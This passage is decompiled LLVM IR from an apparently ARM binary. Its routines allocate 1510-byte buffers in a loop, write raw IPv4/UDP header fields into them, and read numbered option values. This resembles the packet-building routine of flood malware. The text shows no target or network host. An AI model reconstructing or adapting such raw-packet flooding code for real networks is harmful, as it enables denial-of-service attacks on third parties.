  store i32 %v2_a134, i32* %r1.global-to-local, align 4
  %v1_a138 = and i32 %v3_a11c, 65280
  store i32 %v1_a138, i32* %r3.global-to-local, align 4
  %v1_a130 = udiv i32 %v3_a11c, 256
  %v3_a13c = and i32 %v1_a130, 65280
  store i32 %v3_a13c, i32* %r2.global-to-local, align 4
  %v3_a140 = mul i32 %v3_a11c, 16777216
  store i32 %v3_a140, i32* %ip.global-to-local, align 4
  %v1_a144 = add i32 %v2_a134, 20
  %v2_a144 = inttoptr i32 %v1_a144 to i8*
  %v3_a144 = load i8, i8* %v2_a144, align 1
  %v4_a144 = zext i8 %v3_a144 to i32
  %v4_a148 = mul nuw nsw i32 %v1_a138, 256
  %v5_a148 = or i32 %v4_a148, %v3_a140
  store i32 %v5_a148, i32* %ip.global-to-local, align 4
  %v2_a150 = call i32 @llvm.bswap.i32(i32 %v3_a11c)
  %v7_a154 = lshr i32 %v0_a120, %v4_a144
  %v8_a154 = add i32 %v7_a154, %v2_a150
  store i32 %v8_a154, i32* %r2.global-to-local, align 4
  %v3_a160 = mul i32 %v8_a154, 16777216
  %v1_a158 = mul i32 %v8_a154, 256
  %v4_a164 = and i32 %v1_a158, 16711680
  %v5_a164 = or i32 %v4_a164, %v3_a160
  store i32 %v5_a164, i32* %r1.global-to-local, align 4
  store i32 %v6_9dcc, i32* %r0.global-to-local, align 4
  %v2_a174 = call i32 @llvm.bswap.i32(i32 %v8_a154)
  store i32 %v2_a174, i32* %r3.global-to-local, align 4
  store i1 %v2_a028, i1* %cpsr_z.global-to-local, align 1
  %v1_a17c = load i32, i32* @r5, align 4
  %v2_a17c = add i32 %v1_a17c, 16
  %v3_a17c = inttoptr i32 %v2_a17c to i32*
  store i32 %v2_a174, i32* %v3_a17c, align 4
  br i1 %v2_a028, label %dec_label_pc_a184, label %dec_label_pc_a030

dec_label_pc_a184:                                ; preds = %dec_label_pc_a11c, %dec_label_pc_a024
  %v0_a184 = call i32 @function_f67c()
  store i32 %v0_a184, i32* %r0.global-to-local, align 4
  store i32 %v3_9e54, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_a194, i1* %cpsr_z.global-to-local, align 1
  %v1_a198 = load i32, i32* @r5, align 4
  %v2_a198 = add i32 %v1_a198, 12
  %v3_a198 = inttoptr i32 %v2_a198 to i32*
  store i32 %v0_a184, i32* %v3_a198, align 4
  br i1 %v9_a194, label %dec_label_pc_a1a0, label %dec_label_pc_a184.dec_label_pc_a044_crit_edge

dec_label_pc_a184.dec_label_pc_a044_crit_edge:    ; preds = %dec_label_pc_a184
  %v1_a048.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a044

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a184, %dec_label_pc_a030
  %v0_a1a0 = call i32 @function_f67c()
  %v1_a1a0 = trunc i32 %v0_a1a0 to i8
  store i32 %v0_a1a0, i32* %r0.global-to-local, align 4
  store i32 %v3_9e38, i32* %r2.global-to-local, align 4
  %v4_a1a8 = sdiv i32 %v0_a1a0, 256
  store i32 %v4_a1a8, i32* %r3.global-to-local, align 4
  %v1_a1ac = load i32, i32* @r4, align 4
  %v9_a1ac = icmp eq i32 %v3_9e38, %v1_a1ac
  store i1 %v9_a1ac, i1* %cpsr_z.global-to-local, align 1
  %v1_a1b0 = trunc i32 %v4_a1a8 to i8
  %v2_a1b0 = load i32, i32* @r5, align 4
  %v3_a1b0 = add i32 %v2_a1b0, 5
  %v4_a1b0 = inttoptr i32 %v3_a1b0 to i8*
  store i8 %v1_a1b0, i8* %v4_a1b0, align 1
  %v3_a1b4 = load i32, i32* @r5, align 4
  %v4_a1b4 = add i32 %v3_a1b4, 4
  %v5_a1b4 = inttoptr i32 %v4_a1b4 to i8*
  store i8 %v1_a1a0, i8* %v5_a1b4, align 1
  %v0_a1b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b8, label %dec_label_pc_a1bc, label %dec_label_pc_a1a0.dec_label_pc_a050_crit_edge

dec_label_pc_a1a0.dec_label_pc_a050_crit_edge:    ; preds = %dec_label_pc_a1a0
  %v1_a054.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a050

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a1a0, %dec_label_pc_a044
  %v0_a1bc = call i32 @function_f67c()
  %v1_a1bc = trunc i32 %v0_a1bc to i8
  store i32 %v0_a1bc, i32* %r0.global-to-local, align 4
  %v4_a1c0 = sdiv i32 %v0_a1bc, 256
  store i32 %v4_a1c0, i32* %r3.global-to-local, align 4
  %v3_a1c4 = load i32, i32* @r5, align 4
  %v4_a1c4 = add i32 %v3_a1c4, 20
  %v5_a1c4 = inttoptr i32 %v4_a1c4 to i8*
  store i8 %v1_a1bc, i8* %v5_a1c4, align 1
  %v0_a1c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1c8 = trunc i32 %v0_a1c8 to i8
  %v2_a1c8 = load i32, i32* @r6, align 4
  %v3_a1c8 = add i32 %v2_a1c8, 1
  %v4_a1c8 = inttoptr i32 %v3_a1c8 to i8*
  store i8 %v1_a1c8, i8* %v4_a1c8, align 1
  store i32 %v3_9e58, i32* %r3.global-to-local, align 4
  %v1_a1d0 = load i32, i32* @r4, align 4
  %v9_a1d0 = icmp eq i32 %v3_9e58, %v1_a1d0
  store i1 %v9_a1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1d0, label %dec_label_pc_a1d8, label %dec_label_pc_a05c

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a1bc, %dec_label_pc_a050
  %v0_a1d8 = call i32 @function_f67c()
  %v1_a1d8 = trunc i32 %v0_a1d8 to i8
  store i32 %v0_a1d8, i32* %r0.global-to-local, align 4
  store i32 %v1_9db8, i32* %ip.global-to-local, align 4
  %v4_a1e0 = sdiv i32 %v0_a1d8, 256
  store i32 %v4_a1e0, i32* %r3.global-to-local, align 4
  store i1 %v2_a060, i1* %cpsr_z.global-to-local, align 1
  %v1_a1e8 = trunc i32 %v4_a1e0 to i8
  %v2_a1e8 = load i32, i32* @r6, align 4
  %v3_a1e8 = add i32 %v2_a1e8, 3
  %v4_a1e8 = inttoptr i32 %v3_a1e8 to i8*
  store i8 %v1_a1e8, i8* %v4_a1e8, align 1
  %v3_a1ec = load i32, i32* @r6, align 4
  %v4_a1ec = add i32 %v3_a1ec, 2
  %v5_a1ec = inttoptr i32 %v4_a1ec to i8*
  store i8 %v1_a1d8, i8* %v5_a1ec, align 1
  %v0_a1f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f0, label %dec_label_pc_a068, label %dec_label_pc_a1f4

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a05c, %dec_label_pc_a1d8
  %v0_a1f4 = load i32, i32* @r5, align 4
  %v1_a1f4 = add i32 %v0_a1f4, 28
  store i32 %v1_a1f4, i32* %r0.global-to-local, align 4
  store i32 %v0_9e30, i32* @r1, align 4
  %v1_a1fc = inttoptr i32 %v1_a1f4 to i8*
  %v2_a1fc = call i32 @function_f7fc(i8* %v1_a1fc)
  store i32 %v2_a1fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a068

dec_label_pc_a204:                                ; preds = %dec_label_pc_9df0
  store i32 %v3_9de0, i32* %r0.global-to-local, align 4
  %v1_a208 = call i32 @close(i32 %v3_9de0)
  store i32 %v1_a208, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a20c

dec_label_pc_a20c:                                ; preds = %dec_label_pc_9ca4, %dec_label_pc_a204
  %v29_a210 = phi i32 [ -1, %dec_label_pc_9ca4 ], [ %v1_a208, %dec_label_pc_a204 ]
  store i32 %v3_9ca4, i32* %r4.global-to-local, align 4
  store i32 %v6_9ca4, i32* %r5.global-to-local, align 4
  store i32 %v9_9ca4, i32* %r6.global-to-local, align 4
  store i32 %v12_9ca4, i32* %r7.global-to-local, align 4
  store i32 %v18_9ca4, i32* %sb.global-to-local, align 4
  store i32 %v24_9ca4, i32* %fp.global-to-local, align 4
  ret i32 %v29_a210

dec_label_pc_a214:                                ; preds = %dec_label_pc_9e74
  %v3_a218 = sext i8 %v5_9ed8 to i32
  %v7_a218 = sext i8 %v5_9edc to i32
  %v3_a21c = sdiv i32 %v3_a218, 256
  store i32 %v3_a21c, i32* %r0.global-to-local, align 4
  %v3_a220 = sdiv i32 %v7_a218, 256
  store i32 %v3_a220, i32* %r1.global-to-local, align 4
  store i32 %v1_9eb0, i32* %r2.global-to-local, align 4
  store i32 %v1_9eb4, i32* %r3.global-to-local, align 4
  %v3_a22c34 = udiv i32 %v1_9ecc, 256
  store i32 %v3_a22c34, i32* %ip.global-to-local, align 4
  %v5_a240 = trunc i32 %v3_a22c34 to i8
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_a298 = sext i8 %v5_9d34 to i32
  %sext12 = mul i32 %v0_9e34, 16777216
  %v4_a300 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_9e44, 16777216
  %v4_a310 = sdiv i32 %sext13, 16777216
  %v1_a318 = trunc i32 %v4_a310 to i8
  br label %dec_label_pc_a248

dec_label_pc_a248:                                ; preds = %dec_label_pc_a248, %dec_label_pc_a214
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a254 = call i32* @calloc(i32 1510, i32 1)
  %v4_a254 = ptrtoint i32* %v2_a254 to i32
  store i32 %v4_a254, i32* %r0.global-to-local, align 4
  store i32 %v4_9cc4, i32* %r1.global-to-local, align 4
  %v3_a25c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a25c, i32* %r2.global-to-local, align 4
  %v2_a260 = load i32, i32* %r6.global-to-local, align 4
  %v5_a260 = mul i32 %v2_a260, 4
  %v6_a260 = add i32 %v5_a260, %v4_9cc4
  %v7_a260 = inttoptr i32 %v6_a260 to i32*
  store i32 %v4_a254, i32* %v7_a260, align 4
  %v0_a264 = load i32, i32* %r1.global-to-local, align 4
  %v1_a264 = load i32, i32* %r2.global-to-local, align 4
  %v4_a264 = mul i32 %v1_a264, 4
  %v5_a264 = add i32 %v4_a264, %v0_a264
  %v6_a264 = inttoptr i32 %v5_a264 to i32*
  %v7_a264 = load i32, i32* %v6_a264, align 4
  store i32 %v7_a264, i32* %r1.global-to-local, align 4
  %v1_a268 = inttoptr i32 %v7_a264 to i8*
  %v2_a268 = load i8, i8* %v1_a268, align 1
  %tmp85 = urem i8 %v2_a268, 16
  %v1_a26c = zext i8 %tmp85 to i32
  %v1_a270 = or i32 %v1_a26c, 64
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  %v1_a274 = trunc i32 %v1_a270 to i8
  store i8 %v1_a274, i8* %v1_a268, align 1
  %v0_a278 = load i32, i32* %r1.global-to-local, align 4
  %v1_a278 = inttoptr i32 %v0_a278 to i8*
  %v2_a278 = load i8, i8* %v1_a278, align 1
  %v3_a278 = zext i8 %v2_a278 to i32
  %v1_a27c = and i32 %v3_a278, 240
  %v1_a280 = or i32 %v1_a27c, 5
  store i32 %v1_a280, i32* %r2.global-to-local, align 4
  %v3_a288 = add i32 %v0_a278, 9
  %v4_a288 = inttoptr i32 %v3_a288 to i8*
  store i8 17, i8* %v4_a288, align 1
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = trunc i32 %v0_a28c to i8
  %v2_a28c = load i32, i32* %r1.global-to-local, align 4
  %v3_a28c = inttoptr i32 %v2_a28c to i8*
  store i8 %v1_a28c, i8* %v3_a28c, align 1
  %v2_a294 = load i32, i32* %r1.global-to-local, align 4
  %v3_a294 = add i32 %v2_a294, 1
  %v4_a294 = inttoptr i32 %v3_a294 to i8*
  store i8 %v5_9cfc, i8* %v4_a294, align 1
  store i32 %v4_a298, i32* %r0.global-to-local, align 4
  %v2_a29c = load i32, i32* %r1.global-to-local, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v5_9d34, i8* %v4_a29c, align 1
  %v3_a2a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a2a0, i32* %r2.global-to-local, align 4
  store i32 %v6_9dcc, i32* %ip.global-to-local, align 4
  %v3_a2a8 = mul i32 %v3_a2a0, 32
  store i32 %v3_a2a8, i32* %r3.global-to-local, align 4
  %v1_a2ac = load i32, i32* %r1.global-to-local, align 4
  %v2_a2ac = add i32 %v1_a2ac, 12
  %v3_a2ac = inttoptr i32 %v2_a2ac to i32*
  store i32 %v6_9dcc, i32* %v3_a2ac, align 4
  %v0_a2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a2b0 = load i32, i32* %r2.global-to-local, align 4
  %tmp86 = mul i32 %v1_a2b0, -8
  %v5_a2b0 = add i32 %v0_a2b0, %tmp86
  %v1_a2b4 = load i32, i32* @r8, align 4
  %v2_a2b4 = add i32 %v5_a2b0, %v1_a2b4
  store i32 %v2_a2b4, i32* %r3.global-to-local, align 4
  %v1_a2b8 = add i32 %v2_a2b4, 16
  %v2_a2b8 = inttoptr i32 %v1_a2b8 to i32*
  %v3_a2b8 = load i32, i32* %v2_a2b8, align 4
  %v1_a2bc = load i32, i32* %r1.global-to-local, align 4
  %v2_a2bc = add i32 %v1_a2bc, 16
  %v3_a2bc = inttoptr i32 %v2_a2bc to i32*
  store i32 %v3_a2b8, i32* %v3_a2bc, align 4
  %v0_a2c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2c4 = add i32 %v0_a2c4, 1
  store i32 %v1_a2c4, i32* %r6.global-to-local, align 4
  store i32 %v7_a218, i32* %ip.global-to-local, align 4
  store i32 %v3_a21c, i32* %r2.global-to-local, align 4
  %v2_a2d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a2d0 = add i32 %v2_a2d0, 2
  %v4_a2d0 = inttoptr i32 %v3_a2d0 to i8*
  store i8 %v5_9ed8, i8* %v4_a2d0, align 1
  store i32 %v3_a220, i32* %r0.global-to-local, align 4
  %v0_a2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2d8 = trunc i32 %v0_a2d8 to i8
  %v2_a2d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a2d8 = add i32 %v2_a2d8, 3
  %v4_a2d8 = inttoptr i32 %v3_a2d8 to i8*
  store i8 %v1_a2d8, i8* %v4_a2d8, align 1
  %v0_a2dc = load i32, i32* %ip.global-to-local, align 4
  %v1_a2dc = trunc i32 %v0_a2dc to i8
  %v2_a2dc = load i32, i32* %r1.global-to-local, align 4
  %v3_a2dc = add i32 %v2_a2dc, 4
  %v4_a2dc = inttoptr i32 %v3_a2dc to i8*
  store i8 %v1_a2dc, i8* %v4_a2dc, align 1
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 20
  store i32 %v1_a2e8, i32* %r3.global-to-local, align 4
  %v0_a2ec = load i32, i32* %r0.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i8
  %v3_a2ec = add i32 %v0_a2e8, 5
  %v4_a2ec = inttoptr i32 %v3_a2ec to i8*
  store i8 %v1_a2ec, i8* %v4_a2ec, align 1
  %v0_a2f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i8
  %v2_a2f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 6
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i8*
  store i8 %v1_a2f0, i8* %v4_a2f0, align 1
  %v0_a2f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i8
  %v2_a2f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 7
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i8*
  store i8 %v1_a2f4, i8* %v4_a2f4, align 1
  %v0_a2f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_a2f8 = trunc i32 %v0_a2f8 to i8
  %v2_a2f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a2f8 = add i32 %v2_a2f8, 20
  %v4_a2f8 = inttoptr i32 %v3_a2f8 to i8*
  store i8 %v1_a2f8, i8* %v4_a2f8, align 1
  store i32 %v3_a22c34, i32* %r0.global-to-local, align 4
  store i32 %v4_a300, i32* %r1.global-to-local, align 4
  %v2_a304 = load i32, i32* %r3.global-to-local, align 4
  %v3_a304 = add i32 %v2_a304, 5
  %v4_a304 = inttoptr i32 %v3_a304 to i8*
  store i8 %v5_a240, i8* %v4_a304, align 1
  %v0_a308 = load i32, i32* %r1.global-to-local, align 4
  %v1_a308 = trunc i32 %v0_a308 to i8
  %v2_a308 = load i32, i32* %r3.global-to-local, align 4
  %v3_a308 = add i32 %v2_a308, 1
  %v4_a308 = inttoptr i32 %v3_a308 to i8*
  store i8 %v1_a308, i8* %v4_a308, align 1
  %v0_a30c = load i32, i32* %r5.global-to-local, align 4
  %v1_a30c = trunc i32 %v0_a30c to i8
  %v2_a30c = load i32, i32* %r3.global-to-local, align 4
  %v3_a30c = add i32 %v2_a30c, 2
  %v4_a30c = inttoptr i32 %v3_a30c to i8*
  store i8 %v1_a30c, i8* %v4_a30c, align 1
  store i32 %v4_a310, i32* %r2.global-to-local, align 4
  %v0_a314 = load i32, i32* %r6.global-to-local, align 4
  %v1_a314 = load i32, i32* @sl, align 4
  %v9_a314 = icmp eq i32 %v0_a314, %v1_a314
  store i1 %v9_a314, i1* %cpsr_z.global-to-local, align 1
  %v2_a318 = load i32, i32* %r3.global-to-local, align 4
  %v3_a318 = add i32 %v2_a318, 3
  %v4_a318 = inttoptr i32 %v3_a318 to i8*
  store i8 %v1_a318, i8* %v4_a318, align 1
  %v0_a31c = load i32, i32* %r7.global-to-local, align 4
  %v1_a31c = trunc i32 %v0_a31c to i8
  %v2_a31c = load i32, i32* %r3.global-to-local, align 4
  %v3_a31c = add i32 %v2_a31c, 4
  %v4_a31c = inttoptr i32 %v3_a31c to i8*
  store i8 %v1_a31c, i8* %v4_a31c, align 1
  %v0_a320 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_a320, i32* %stack_var_-40, align 4
  %v5_a324 = icmp slt i32 %v0_a314, %v1_a314
  br i1 %v5_a324, label %dec_label_pc_a248, label %dec_label_pc_9fe8

; uselistorder directives
  uselistorder i32 %v3_a22c34, { 2, 0, 1 }
  uselistorder i32 %v3_a220, { 1, 0 }
  uselistorder i32 %v3_a21c, { 1, 0 }
  uselistorder i32 %v7_a218, { 1, 0 }
  uselistorder i32 %v4_a1e0, { 1, 0 }
  uselistorder i32 %v0_a1d8, { 0, 2, 1 }
  uselistorder i32 %v0_a1bc, { 0, 2, 1 }
  uselistorder i32 %v4_a1a8, { 1, 0 }
  uselistorder i32 %v0_a1a0, { 0, 2, 1 }
  uselistorder i32 %v2_a174, { 1, 0 }
  uselistorder i32 %v8_a154, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a140, { 1, 0 }
  uselistorder i32 %v3_a11c, { 1, 3, 2, 0, 4 }
  uselistorder i1 %v2_a110, { 1, 0 }
  uselistorder i32 %v1_a104, { 0, 2, 3, 1 }
  uselistorder i32 %v1_a100, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_a0a8, { 0, 2, 1 }
  uselistorder i32 %v0_a090, { 1, 0, 2, 3 }
  uselistorder i32 %v4_a07c, { 1, 0 }
  uselistorder i32 %v2_a078, { 0, 2, 1 }
  uselistorder i1 %v2_a028, { 3, 0, 1, 2 }
  uselistorder i1 %v9_a194, { 2, 3, 1, 0 }
  uselistorder i8 %v5_9ed8, { 0, 2, 1 }
  uselistorder i32 %v3_9ec4, { 1, 0 }
  uselistorder i32 %v1_9eb4, { 2, 3, 0, 1 }
  uselistorder i32 %v1_9eb0, { 1, 2, 0 }
  uselistorder i32 %v1_9ea8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_9ea0, { 1, 0 }
  uselistorder i32 %v1_9e78, { 2, 1, 0, 3 }
  uselistorder i32 %v3_9e58, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_9e54, { 1, 2, 0, 3 }
  uselistorder i32 %v0_9e40, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_9e38, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9e34, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_9e30, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_9e24, { 3, 1, 2, 0 }
  uselistorder i32 %v3_9de0, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v6_9dcc, { 1, 0, 6, 4, 5, 3, 2 }
  uselistorder i32 %v1_9db8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_9d44, { 1, 0 }
  uselistorder i8 %v5_9d34, { 1, 0, 2 }
  uselistorder i32 %v5_9d18, { 1, 0 }
  uselistorder i8 %v5_9cfc, { 0, 2, 1 }
  uselistorder i32 %v6_9cdc, { 1, 0 }
  uselistorder i32 %v4_9cc4, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_9ca8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32* %r2.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 30, 29, 31, 32, 34, 33, 36, 35, 0 }
  uselistorder i32* %r0.global-to-local, { 40, 41, 42, 43, 45, 44, 1, 3, 2, 5, 4, 6, 7, 8, 10, 9, 12, 11, 13, 15, 14, 21, 16, 17, 18, 19, 20, 26, 22, 23, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %ip.global-to-local, { 24, 25, 26, 27, 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i1* %cpsr_z.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_a20c, { 1, 0 }
  uselistorder label %dec_label_pc_a1f4, { 1, 0 }
  uselistorder label %dec_label_pc_a068, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9ff0, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_a330(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a330:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_a330 = load i32, i32* @r4, align 4
  %v6_a330 = load i32, i32* @r5, align 4
  %v9_a330 = load i32, i32* @r6, align 4
  %v12_a330 = load i32, i32* @r7, align 4
  %v15_a330 = load i32, i32* @r8, align 4
  %v21_a330 = load i32, i32* @sl, align 4
  %v1_a334 = urem i32 %arg1, 256
  store i32 %v1_a334, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_a334, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_a34c = urem i32 %arg3, 256
  store i32 %v1_a34c, i32* @r4, align 4
  %v2_a350 = call i32* @calloc(i32 %v1_a334, i32 4)
  %v4_a350 = ptrtoint i32* %v2_a350 to i32
  %v0_a354 = load i32, i32* @r5, align 4
  store i32 %v0_a354, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a364 = load i32, i32* @r4, align 4
  store i32 %v0_a364, i32* %r0.global-to-local, align 4
  %v5_a368 = inttoptr i32 %v0_a354 to i32*
  %v6_a368 = call i32 @function_92dc(i32 %v0_a364, i32* %v5_a368, i32 2, i32 0)
  %v1_a374 = urem i32 %v6_a368, 256
  store i32 %v1_a374, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* %r1.global-to-local, align 4
  %v0_a384 = load i32, i32* @r4, align 4
  store i32 %v0_a384, i32* %r0.global-to-local, align 4
  %v5_a388 = trunc i32 %v6_a368 to i8
  %v6_a38c = inttoptr i32 %v0_a380 to i32*
  %v7_a38c = call i32 @function_92dc(i32 %v0_a384, i32* %v6_a38c, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_a390 = load i32, i32* @r5, align 4
  store i32 %v0_a390, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a38c, i32* @r7, align 4
  %v0_a3a0 = load i32, i32* @r4, align 4
  store i32 %v0_a3a0, i32* %r0.global-to-local, align 4
  %v4_a3a4 = inttoptr i32 %v0_a390 to i32*
  %v5_a3a4 = call i32 @function_92dc(i32 %v0_a3a0, i32* %v4_a3a4, i32 4, i32 64)
  %v1_a3ac = urem i32 %v5_a3a4, 256
  store i32 %v1_a3ac, i32* %ip.global-to-local, align 4
  %v0_a3b0 = load i32, i32* @r5, align 4
  store i32 %v0_a3b0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r4, align 4
  store i32 %v0_a3bc, i32* %r0.global-to-local, align 4
  %v5_a3c0 = trunc i32 %v5_a3a4 to i8
  %v6_a3c4 = inttoptr i32 %v0_a3b0 to i32*
  %v7_a3c4 = call i32 @function_92dc(i32 %v0_a3bc, i32* %v6_a3c4, i32 5, i32 1)
  %v1_a3d0 = urem i32 %v7_a3c4, 256
  store i32 %v1_a3d0, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @r5, align 4
  store i32 %v0_a3dc, i32* %r1.global-to-local, align 4
  %v0_a3e0 = load i32, i32* @r4, align 4
  store i32 %v0_a3e0, i32* %r0.global-to-local, align 4
  %v5_a3e8 = inttoptr i32 %v0_a3dc to i32*
  %v6_a3e8 = call i32 @function_92dc(i32 %v0_a3e0, i32* %v5_a3e8, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_a3f0 = load i32, i32* @r5, align 4
  store i32 %v0_a3f0, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a3e8, i32* @sl, align 4
  %v0_a400 = load i32, i32* @r4, align 4
  store i32 %v0_a400, i32* %r0.global-to-local, align 4
  %v4_a404 = inttoptr i32 %v0_a3f0 to i32*
  %v5_a404 = call i32 @function_92dc(i32 %v0_a400, i32* %v4_a404, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_a408 = load i32, i32* @r5, align 4
